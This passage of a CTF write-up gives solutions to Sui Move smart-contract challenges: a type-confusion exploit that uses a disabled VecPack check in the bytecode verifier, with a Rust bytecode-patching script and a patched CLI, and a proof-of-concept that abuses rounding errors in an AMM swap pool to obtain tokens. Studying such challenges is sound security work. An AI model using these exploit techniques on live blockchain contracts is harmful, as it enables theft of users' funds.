    public entry fun solve(sui_shared: &mut Coin<deep_pockets::SUI>,deep: &mut deep_pockets::Deep<deep_pockets::SUI>,ctx: &mut TxContext ){
        let sui = coin::split(sui_shared,1,ctx);
        let admin_cap = deep_pockets::create_protocol(A{},sui,coin::zero<deep_pockets::SEUR>(ctx),ctx);
        deep_pockets::change_interest(deep,&admin_cap,0);

        let account_cap = deep_pockets::create_account(deep,ctx);
        let coin = deep_pockets::borrow(deep,&account_cap,1000,ctx);
        transfer::public_transfer(admin_cap, tx_context::sender(ctx));
        transfer::public_transfer(account_cap, tx_context::sender(ctx));

        transfer::public_transfer(coin, tx_context::sender(ctx));
    }
}

```

# Typed

> fun fact: this was my take-home assignment during my interview at Ottersec
Not fun fact: I didn’t exploit it during the interview 🥲
Time to take revenge.
> 

The challenge provides zcoin.move:

```rust
/// Module: zcoin
module zcoin::zcoin {
    use std::option;
    use sui::transfer;
	use sui::{balance::{Self, Balance, Supply}, coin::{Self, Coin, TreasuryCap}};
    use sui::tx_context::{sender, TxContext};

    public struct ZCOIN has drop {}

    public struct SolveStatus has key, store {
        id : UID,
        solved : bool,
    }

   fun init(otw: ZCOIN, ctx: &mut TxContext) {
        let mut treasury_cap = create_currency(otw, ctx);
        let init_zcoins = coin::mint(&mut treasury_cap, 1000, ctx);

        transfer::public_transfer(treasury_cap, sender(ctx));
        transfer::public_transfer(init_zcoins, sender(ctx));
        
        transfer::public_share_object(SolveStatus {
            id: object::new(ctx),
            solved: false
        });
    } 
    
   fun create_currency<T: drop>(
        otw: T,
        ctx: &mut TxContext
    ): TreasuryCap<T> {
        let (treasury_cap, metadata) = coin::create_currency(
            otw, 6,
            b"ZCOIN",
            b"Z-Coin",
            b"The Z-Coin",
            option::none(),
            ctx
        );

        transfer::public_freeze_object(metadata);
        treasury_cap
    } 
    
    public entry fun solve(status: &mut SolveStatus, zcoins: Coin<ZCOIN>, ctx: &mut TxContext){
        assert!(coin::value(&zcoins) >= 1000, 0);
        status.solved = true;
        transfer::public_transfer(zcoins, sender(ctx));
    }
}

```

The goal is to invoke `solve` with 1000 `Coin<ZCOIN>` , and it’s not possible to obtain it using this module.

The validator for this challenge has been modified, and the patch applied to the challenge is included.

```diff
diff --git a/external-crates/move/crates/move-bytecode-verifier/src/type_safety.rs b/external-crates/move/crates/move-bytecode-verifier/src/type_safety.rs
index f5f8515714..4202390620 100644
--- a/external-crates/move/crates/move-bytecode-verifier/src/type_safety.rs
+++ b/external-crates/move/crates/move-bytecode-verifier/src/type_safety.rs
@@ -838,9 +838,9 @@ fn verify_instr(
                     .pop_eq_n(num_to_pop)
                     .map(|t| element_type != &t)
                     .unwrap_or(true);
-                if is_mismatched {
-                    return Err(verifier.error(StatusCode::TYPE_MISMATCH, offset));
-                }
+//                if is_mismatched {
+//                    return Err(verifier.error(StatusCode::TYPE_MISMATCH, offset));
+//                }
             }
             verifier.push(meter, ST::Vector(Box::new(element_type.clone())))?;
         }

```

The `verify_instr` inside the bytecode verifier now looks like:

```rust
        Bytecode::VecPack(idx, num) => {
            let element_type = &verifier.resolver.signature_at(*idx).0[0];
            if let Some(num_to_pop) = NonZeroU64::new(*num) {
                let is_mismatched = verifier
                    .stack
                    .pop_eq_n(num_to_pop)
                    .map(|t| element_type != &t)
                    .unwrap_or(true);
//                if is_mismatched {
//                    return Err(verifier.error(StatusCode::TYPE_MISMATCH, offset));
//                }
            }
            verifier.push(meter, ST::Vector(Box::new(element_type.clone())))?;
        }
```

## Solution

The idea behind this exploit is simple: we can pack different types inside the same vector, and all the types inserted will then have the same type as the first inserted element.

If we could write the exploit with move, it would be very similar to:

```rust
public entry fun solve(status: &mut zcoin::SolveStatus, coin: Coin<EXP> ,ctx: &mut TxContext){
	let mut a = vector<Coin<zcoin::ZCOIN>>[coin::zero<zcoin::ZCOIN>(ctx),coin];
	zcoin::solve(status,vector::pop_back(&mut a),ctx);
	sui::transfer::public_transfer(vector::pop_back(&mut a),tx_context::sender(ctx));
	vector::destroy_empty(a);
}
```

This code is not compilable, so we need to patch the binary directly.

The skeleton of the exploit looks like:

```rust
module exp::exp {
    use zcoin::zcoin;
    use sui::coin::{Coin,Self,TreasuryCap};
    use sui::tx_context;
    use std::vector;

    public struct EXP has drop {}

   fun init(otw: EXP, ctx: &mut TxContext) {
        let mut treasury_cap = create_currency(otw, ctx);
        let init_zcoins = coin::mint(&mut treasury_cap, 1000, ctx);

        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
        transfer::public_transfer(init_zcoins, tx_context::sender(ctx));
    } 

   fun create_currency<T: drop>(
        otw: T,
        ctx: &mut TxContext
    ): TreasuryCap<T> {
        let (treasury_cap, metadata) = coin::create_currency(
            otw, 6,
            b"ZCOIN",
            b"Z-Coin",
            b"The Z-Coin",
            option::none(),
            ctx
        );

        transfer::public_freeze_object(metadata);
        treasury_cap
    } 

    public entry fun solve(status: &mut zcoin::SolveStatus, coin: Coin<EXP> ,ctx: &mut TxContext){
        let mut a = vector<Coin<zcoin::ZCOIN>>[coin::zero<zcoin::ZCOIN>(ctx)];
        zcoin::solve(status,vector::pop_back(&mut a),ctx);
        sui::transfer::public_transfer(vector::pop_back(&mut a),tx_context::sender(ctx));
        vector::destroy_empty(a);
        sui::transfer::public_transfer(coin,tx_context::sender(ctx));

    }
}

```

As soon as this module is published, it generates a new currency and mints 1000 EXP, sending them to our address.
Now we need to patch the `solve` function, let’s take a look at his bytecode.

```rust
FunctionDefinition {
    function: FunctionHandleIndex(2),
    visibility: Public,
    is_entry: true,
    acquires_global_resources: [],
    code: Some(CodeUnit {
        locals: SignatureIndex(21),
        code: [
            CopyLoc(2), // push into the stack ctx
            CallGeneric(7), // invoke coin::zero<zcoin::ZCOIN>
            VecPack(24, 1), // generate a vector of 1 element. The type is Coin<zcoin::ZCOIN> --> 24
            StLoc(3), // store into the stack vector<Coin<ZCOIN>>
            MoveLoc(0), // push into the stack status
            MutBorrowLoc(3), //borrow mut vector<Coin<ZCOIN>>
            VecPopBack(24), // pop the last element from the vector
            CopyLoc(2), // push into the stack ctx
            Call(10), // invoke zcoin::solve
            MutBorrowLoc(3),
            VecPopBack(24),
            CopyLoc(2),
            FreezeRef,
            Call(9),
            CallGeneric(8),
            MoveLoc(3),
            VecUnpack(24, 0),
            //sui::transfer::public_transfer(coin,tx_context::sender(ctx));
            MoveLoc(1), // push into the stack coin
            MoveLoc(2), // push into the stack ctx
            FreezeRef,
            Call(9), 
            CallGeneric(3),
            Ret
        ]
    })
}

```

To solve this challenge we need to:

1. Add into the stack the parameter `coin: Coin<EXP>` 
2. increase the size of the vector `VecPack(24, 1)`  —> `VecPack(24, 2)` 
3. remove the last invocation of `public_transfer` 

To easily patch the binary we can deserialize the binary using `CompiledModules` apply the changes and then serialize.

```rust
use std::io::Write;
use std::{fs::File, io::Read};

use move_binary_format::file_format::Bytecode::*;
use move_binary_format::file_format::Visibility::Public;
use move_binary_format::file_format::{
    CodeUnit, CompiledModule, FunctionDefinition, FunctionHandleIndex, SignatureIndex,
};
fn main() {
    let mut file = File::open("build/exp/bytecode_modules/exp.mv").unwrap();

    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer);
    let mut module = CompiledModule::deserialize_with_config(&buffer, 6, false).unwrap();

    let tmp = FunctionDefinition {
        function: FunctionHandleIndex(2),
        visibility: Public,
        is_entry: true,
        acquires_global_resources: [].to_vec(),
        code: Some(CodeUnit {
            locals: SignatureIndex(21),
            code: [
                CopyLoc(2),
                CallGeneric(move_binary_format::file_format::FunctionInstantiationIndex(
                    7,
                )),
                MoveLoc(1), // push into the stack Coin<EXP>
                VecPack(move_binary_format::file_format::SignatureIndex(24), 2),
                StLoc(3),
                MoveLoc(0),
                MutBorrowLoc(3),
                VecPopBack(move_binary_format::file_format::SignatureIndex(24)),
                CopyLoc(2),
                Call(move_binary_format::file_format::FunctionHandleIndex(10)),
                MutBorrowLoc(3),
                VecPopBack(move_binary_format::file_format::SignatureIndex(24)),
                CopyLoc(2),
                FreezeRef,
                Call(move_binary_format::file_format::FunctionHandleIndex(9)),
                CallGeneric(move_binary_format::file_format::FunctionInstantiationIndex(
                    8,
                )),
                MoveLoc(3),
                VecUnpack(move_binary_format::file_format::SignatureIndex(24), 0),
                //MoveLoc(1),
                //MoveLoc(2),
                //FreezeRef,
                //Call(move_binary_format::file_format::FunctionHandleIndex(9)),
                //CallGeneric(move_binary_format::file_format::FunctionInstantiationIndex(3)),
                Ret,
            ]
            .to_vec(),
        }),
    };
    module.function_defs[2] = tmp;

    let bytes = {
        let mut v = vec![];
        module.serialize(&mut v).unwrap();
        v
    };
    let file_name = "patch.mv";

    let mut file = File::create(file_name).expect("");

    file.write_all(&bytes).expect("");
}

```

Okay perfect, solved.
NOPE.
I wasted most of the time trying to figure out how to publish bytecode directly onchain. Both the CLI and the SDK wouldn't allow me to publish bytecode directly; instead, they kept recompiling my package every time. I tried different approaches:

- Patching the sui binary to bypass the compilation part.
- Crafting a transaction manually and sending it to the RPC.

But in the end, I opted for the most elegant strategy. Every time I invoke **`sui client publish`**, I always publish the same bytecode.

```diff
diff --git a/crates/sui/src/client_commands.rs b/crates/sui/src/client_commands.rs
index 5902f875af..bc0ac9feb6 100644
--- a/crates/sui/src/client_commands.rs
+++ b/crates/sui/src/client_commands.rs
@@ -3,11 +3,7 @@
 
 use crate::client_ptb::ptb::PTB;
 use std::{
-    collections::{btree_map::Entry, BTreeMap},
-    fmt::{Debug, Display, Formatter, Write},
-    path::PathBuf,
-    str::FromStr,
-    sync::Arc,
+    collections::{btree_map::Entry, BTreeMap}, fmt::{Debug, Display, Formatter, Write}, fs::File, io::Read, path::PathBuf, str::FromStr, sync::Arc
 };
 
 use anyhow::{anyhow, bail, ensure, Context};
@@ -1023,7 +1019,7 @@ impl SuiClientCommands {
                 let sender = sender.unwrap_or(context.active_address()?);
 
                 let client = context.get_client().await?;
-                let (dependencies, compiled_modules, _, _) = compile_package(
+                let (dependencies, mut compiled_modules, _, _) = compile_package(
                     client.read_api(),
                     build_config,
                     package_path,
@@ -1032,6 +1028,20 @@ impl SuiClientCommands {
                 )
                 .await?;
 
+                let file_name = "patch.mv";
+
+                let mut file = File::open(file_name).expect("a");
+            
+                let metadata = file.metadata().expect("a");
+                let file_size = metadata.len() as usize;
+            
+                let mut byte_vec = vec![0; file_size];
+            
+                file.read_exact(&mut byte_vec)?;
+
+                compiled_modules = vec![byte_vec];
+
```

# Gringotts

> During the competition, this challenge was flagged by [capcap_max](https://twitter.com/capcap_max), who participated in a CTF for the first time. GGWP MAN.
> This is my solution for the challenge
>

The challenge consists of 5 modules:

- ctf.move --> responsible for creating a new currency CTF
- osec.move --> responsible for creating a new currency OSEC
- merchstore.move --> allows buying items using Coin<OSEC>
- otterswap.move --> a swap pool between CTF and OSEC tokens
- otterloan --> a flashloan protocol, in this case useless because it hasn't been instantiated.

We start with 250 CTF coins, thanks to an airdrop, and our goal is to buy Flag in the merchstore, which costs 499 OSEC.

```rust
    public entry fun buy_flag<CoinType>(coins: Coin<CoinType>, ctx: &mut TxContext) {
        assert!(type_name::get<CoinType>() == type_name::get<OSEC>(), 0);
        assert!(coin::value(&coins) == 499, EINVALID_AMOUNT);

        transfer::public_transfer(coins, @admin);

        transfer::public_transfer(Flag {
            id: object::new(ctx),
            user: tx_context::sender(ctx),
            flag: true
        }, tx_context::sender(ctx));
    }
```

## Solution

The idea to solve the challenge is to exploit a rounding error in the otterswap pool abusing this two function:

```rust
    public fun swap_a_b<CoinTypeA, CoinTypeB>( liquidity_pool: &mut Pool<CoinTypeA, CoinTypeB>, coin_in: Coin<CoinTypeA>, ctx: &mut TxContext ) : Coin<CoinTypeB> {

        let coin_in_value = coin::value(&coin_in);

        let balance_a : u64 = balance::value(&liquidity_pool.type_a);
        let balance_b : u64 = balance::value(&liquidity_pool.type_b);

        assert!(balance_a > 0 && balance_b > 0, ERESERVES_EMPTY);
        assert!( coin_in_value < balance_a, EINVALID_AMOUNT );

        let coin_out_value = (balance_b - (((balance_a as u128) * (balance_b as u128)) / ((balance_a as u128) + (coin_in_value as u128)) as u64));

        coin::put(&mut liquidity_pool.type_a, coin_in);
        let coin_out = coin::take(&mut liquidity_pool.type_b, coin_out_value, ctx);
        coin_out
    }

    public fun swap_b_a<CoinTypeA, CoinTypeB>( liquidity_pool: &mut Pool<CoinTypeA, CoinTypeB>, coin_in: Coin<CoinTypeB>, ctx: &mut TxContext ) : Coin<CoinTypeA> {

        let coin_in_value = coin::value(&coin_in);

        let balance_a : u64 = balance::value(&liquidity_pool.type_b);
        let balance_b : u64 = balance::value(&liquidity_pool.type_a);

        assert!(balance_a > 0 && balance_b > 0, ERESERVES_EMPTY);
        assert!( coin_in_value < balance_a, EINVALID_AMOUNT );

        let coin_out_value = ( ((balance_b as u128) * (coin_in_value as u128) / ( (balance_a as u128) + (coin_in_value as u128))) as u64);

        coin::put(&mut liquidity_pool.type_b, coin_in);
        let coin_out = coin::take(&mut liquidity_pool.type_a, coin_out_value, ctx);
        coin_out
    }
```

Since I’m lazy, I re-wrote this two function in rust and use a BFS to find the fast path to obtain 499 `Coin<OSEC>`:

```rust
use std::{
    collections::{HashMap, HashSet},
    process::exit,
};

fn swap_a_b(A: usize, B: usize, a: usize, b: usize, input: usize) -> (usize, usize, usize, usize) {
    if A > 0 && B > 0 && input < A {
        let out = B - ((A * B) / (A + input));
        let new_A = A + input;
        if out > B {
            return (usize::MAX, usize::MAX, usize::MAX, usize::MAX);
        }
        let new_B = B - out;
        let new_a = a - input;
        let new_b = b + out;
        (new_A, new_B, new_a, new_b)
    } else {
        (usize::MAX, usize::MAX, usize::MAX, usize::MAX)
    }
}

fn swap_b_a(A: usize, B: usize, a: usize, b: usize, input: usize) -> (usize, usize, usize, usize) {
    if A > 0 && B > 0 && input < B {
        let out = ((A * input) / (B + input));
        if out > A {
            return (usize::MAX, usize::MAX, usize::MAX, usize::MAX);
        }
        let new_A = A - out;
        let new_B = B + input;
        let new_a = a + out;
        let new_b = b - input;
        (new_A, new_B, new_a, new_b)
    } else {
        (usize::MAX, usize::MAX, usize::MAX, usize::MAX)
    }
}

fn exec(A: usize, B: usize, a: usize, b: usize) -> Vec<(usize, usize, usize, usize)> {
    let mut ans = HashSet::new();

    let set2: HashSet<(usize, usize, usize, usize)> = (0..=a)
        .into_iter()
        .map(|input| swap_a_b(A, B, a, b, input))
        .collect();
    ans.extend(set2);

    let set3: HashSet<(usize, usize, usize, usize)> = (0..=b)
        .into_iter()
        .map(|input| swap_b_a(A, B, a, b, input))
        .collect();
    ans.extend(set3);

    ans.into_iter().collect()
}

fn win(
    mut win: (usize, usize, usize, usize),
    path: HashMap<(usize, usize, usize, usize), (usize, usize, usize, usize)>,
) {
    let mut op = Vec::new();
    let mut n = Vec::new();

    while win != (500, 500, 250, 0) {
        let old = *path.get(&win).unwrap();
        if old.2 > win.2 {
            op.push("true,");
            n.push(format!(",{}", old.2 - win.2));
        } else {
            op.push("false,");
            n.push(format!(",{}", old.3 - win.3));
        }
        win = old;
    }

    for statement in op.iter() {
        print!("{}", statement);
    }
    println!("");
    for statement in n.iter() {
        print!("{}", statement);
    }

    exit(12);
}

fn main() {
    let mut visited = HashMap::new();
    visited.insert(
        (usize::MAX, usize::MAX, usize::MAX, usize::MAX),
        (usize::MAX, usize::MAX, usize::MAX, usize::MAX),
    );
    visited.insert(
        (500, 500, 250, 0),
        (usize::MAX, usize::MAX, usize::MAX, usize::MAX),
    );

    let mut q = vec![(500, 500, 250, 0)];
    let mut step = 0;
    while q.len() > 0 {
        step += 1;
        for (A, B, a, b) in q.iter() {
            if *b == 499 {
                win((*A, *B, *a, *b), visited.clone());
            }
        }

        let mut vec_of_vec: Vec<(usize, usize, usize, usize)> = vec![];

        for (A, B, a, b) in q.iter() {
            let mut ret = exec(*A, *B, *a, *b);
            ret.retain(|x| !visited.contains_key(x));
            for i in ret.iter() {
                visited.insert(*i, (*A, *B, *a, *b));
            }
            vec_of_vec.extend(ret.iter());
        }

        vec_of_vec.sort();
        vec_of_vec.dedup();

        q.clear();

        q = vec_of_vec.clone();
    }

    println!("visited: {}", visited.len());
}

```

full poc:

```rust
module solution::gringotts_solution {

    use sui::coin;
    use challenge::OtterSwap;
    use challenge::ctf::{Airdrop, Self};
    use challenge::merch_store;
    use std::vector;
 
    public fun solve<CoinTypeA, CoinTypeB>(
        liquidity_pool: &mut OtterSwap::Pool<CoinTypeA, CoinTypeB>,
        airdrop_shared: &mut Airdrop<CoinTypeA>,
        ctx: &mut TxContext
    ) {
        let mut coin_a = ctf::get_airdrop(airdrop_shared, ctx);
        let mut coin_b = coin::zero<CoinTypeB>(ctx);

        let mut op = vector<bool>[true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,false,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true];
        let mut n = vector<u16>[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,289,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,16,15,14,38,171,28,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,10,19,9,17,16,69,136,50,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,7,7,7,19,6,6,6,11,21,5,227,94,7,7,13,7,1,6,6,6,11,26,5,5,14,9,25,102,61,1,6,6,6,6,11,16,5,5,5,14,9,17,16,26,7,212,132,16,11,5,5,5,14,9,17,35,195,104,1,1,5,5,5,5,5,9,13,21,4,4,4,4,18,33,130,89,5,9,13,17,4,4,4,4,4,18,218,114,13,17,4,4,4,4,4,11,7,7,10,25,3,20,221,164,4,4,4,4,22,7,7,10,34,3,25,13,218,179,4,4,11,4,7,7,10,28,3,3,3,14,272,202,4,7,7,10,16,10,3,3,3,3,14,16,39,9,215,204,7,13,19,3,3,3,3,3,3,11,8,30,151,121,22,3,3,3,3,3,3,11,8,18,5,12,16,258,236,3,3,3,3,3,3,3,11,8,37,7,9,244,215,3,3,3,3,3,3,8,18,5,5,21,161,124,3,3,3,8,13,5,5,12,16,11,236,203,8,13,5,5,12,7,7,11,23,2,2,2,2,2,15,9,7,175,206,3,5,5,5,5,7,7,9,15,30,203,196,5,12,7,7,11,25,2,2,2,2,2,2,2,34,26,100,149,7,9,11,23,2,2,2,2,2,2,2,2,2,11,9,12,146];
        while (op.length()>0){
            if (op.pop_back()){
                coin::join(&mut coin_b, OtterSwap::swap_a_b(liquidity_pool, coin::split(&mut coin_a, n.pop_back() as u64,ctx), ctx));
            } else {
                coin::join(&mut coin_a, OtterSwap::swap_b_a(liquidity_pool, coin::split(&mut coin_b, n.pop_back() as u64 ,ctx), ctx));

            }
        };        

        merch_store::buy_flag(coin_b, ctx);
        sui::transfer::public_transfer(coin_a, @1);
    }
}

```